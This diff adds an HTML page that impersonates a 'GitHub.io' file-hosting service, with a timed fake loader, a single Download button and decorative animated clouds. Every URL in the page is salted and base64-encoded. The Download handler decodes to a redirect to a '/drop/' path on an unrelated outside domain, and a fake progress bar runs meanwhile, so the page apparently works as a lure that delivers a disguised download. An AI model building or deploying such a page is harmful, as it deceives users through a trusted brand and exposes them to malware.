@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GitHub.io - Fast and secure GitHub based file hosting</title>
+  <script>
+    (function(){
+      var iconSalted = "q1aHR0cHM6Ly9pLnBvc3RpbWcuY2MvTHM2Qm1xRjMvZmF2aWNvbi5wbmc=z9";
+      var iconEncoded = iconSalted.slice(2, -2);
+      var iconUrl = atob(iconEncoded);
+      document.write('<link rel="icon" type="image/x-icon" href="' + iconUrl + '">');
+      var fontSalted = "r7aHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PUJsYWNrK0hhbitTYW5zx3";
+      var fontEncoded = fontSalted.slice(2, -2);
+      var fontUrl = atob(fontEncoded);
+      document.write('<link href="' + fontUrl + '" rel="stylesheet">');
+    })();
+  </script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      user-select: none;
+    }
+    body {
+      font-family: 'Black Han Sans', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: linear-gradient(to left, #2979ff, #0043ca);
+      color: white;
+      text-align: center;
+      overflow: hidden;
+      position: relative;
+    }
+    .container {
+      text-align: center;
+      padding: 20px;
+      transform: scale(1.35);
+      display: none;
+    }
+    .download-button {
+      font-family: 'Black Han Sans', sans-serif;
+      padding: 20px 50px;
+      background-color: #fff;
+      color: #2979ff;
+      font-size: 26px;
+      border-radius: 50px;
+      border: none;
+      cursor: pointer;
+      font-weight: bold;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      margin-top: 20px;
+      position: relative;
+      transition: 0.3s;
+      animation: glow 1.5s infinite alternate;
+    }
+    .download-button:hover {
+      background-color: #2979ff;
+      color: white;
+    }
+    @keyframes glow {
+      from { box-shadow: 0 0 10px rgba(255, 255, 255, 0.3); }
+      to { box-shadow: 0 0 20px rgba(255, 255, 255, 0.8); }
+    }
+    #progressBar {
+      display: none;
+      width: 80%;
+      height: 20px;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 10px;
+      margin: 20px auto 0;
+    }
+    #progressBar div {
+      height: 100%;
+      width: 0;
+      background: #4caf50;
+      border-radius: 10px;
+      transition: width 0.3s;
+    }
+    #loader {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(to left, #2979ff, #0043ca);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+    .spinner {
+      border: 12px solid rgba(255, 255, 255, 0.3);
+      border-top: 12px solid #fff;
+      border-radius: 50%;
+      width: 80px;
+      height: 80px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .cloud-container {
+      position: absolute;
+      left: 100vw;
+      animation-name: floatClouds;
+      animation-timing-function: linear;
+      animation-iteration-count: infinite;
+      z-index: -1;
+      pointer-events: none;
+    }
+    .cloud {
+      opacity: 0.8;
+      font-size: 60px;
+      animation-name: rockCloud;
+      animation-duration: 3s;
+      animation-timing-function: ease-in-out;
+      animation-iteration-count: infinite;
+    }
+    @keyframes floatClouds {
+      from { transform: translateX(0); }
+      to { transform: translateX(-200vw); }
+    }
+    @keyframes rockCloud {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(10px); }
+    }
+  </style>
+</head>
+<body>
+
+<div id="loader">
+  <div class="spinner"></div>
+</div>
+
+<div class="container">
+  <button type="button" class="download-button" onclick="startDownload()">Download</button>
+  <div id="progressBar"><div></div></div>
+</div>
+
+<script>
+  window.addEventListener('load', function() {
+    setTimeout(function() {
+      document.getElementById('loader').style.display = 'none';
+      document.querySelector('.container').style.display = 'block';
+    }, 4000);
+  });
+
+  function startDownload() {
+    var encodedUrlWithSalt = "J7zaHR0cHM6Ly9keW5hbWljZm9yZXhzb2x1dGlvbnMuY29tL2Ryb3AvaB1";
+    var cleanEncodedUrl = encodedUrlWithSalt.slice(3, -3);
+    var decodedUrl = atob(cleanEncodedUrl);
+    window.location.href = decodedUrl;
+    var progressBar = document.getElementById('progressBar');
+    var progress = progressBar.firstElementChild;
+    progressBar.style.display = 'block';
+    var width = 0;
+    var interval = setInterval(function() {
+      if (width >= 100) {
+        clearInterval(interval);
+      } else {
+        width += 10;
+        progress.style.width = width + '%';
+      }
+    }, 300);
+  }
+
+  function createCloud() {
+    var container = document.createElement("div");
+    container.classList.add("cloud-container");
+    container.style.top = Math.random() * 80 + "vh";
+    var duration = (15 + Math.random() * 10) * 1.35;
+    container.style.animationDuration = duration + "s";
+    var cloud = document.createElement("div");
+    cloud.classList.add("cloud");
+    cloud.innerText = "☁";
+    container.appendChild(cloud);
+    document.body.appendChild(container);
+    setTimeout(function() { container.remove(); }, duration * 1000 + 1000);
+  }
+
+  for (var i = 0; i < 5; i++) {
+    createCloud();
+  }
+  setInterval(createCloud, 4000);
+</script>
+</body>
+</html>
